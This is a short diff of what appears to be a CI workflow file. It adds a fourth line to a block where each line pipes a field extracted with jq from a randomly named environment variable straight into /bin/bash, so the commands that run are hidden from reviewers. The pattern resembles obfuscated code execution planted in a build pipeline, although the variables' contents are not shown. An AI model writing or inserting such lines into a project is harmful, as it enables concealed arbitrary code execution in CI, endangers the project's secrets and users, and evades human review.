@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$ekcve183" | jq -r .kqfqo729 | /bin/bash
           echo $ov43905 | jq -r .pzt457 | /bin/bash
           echo $b7 | jq -r .yx75 | /bin/bash
+          printf '%s' "$ztmk56571" | jq -r .isco0 | /bin/bash
 
       - name: Persist results
         if: always()
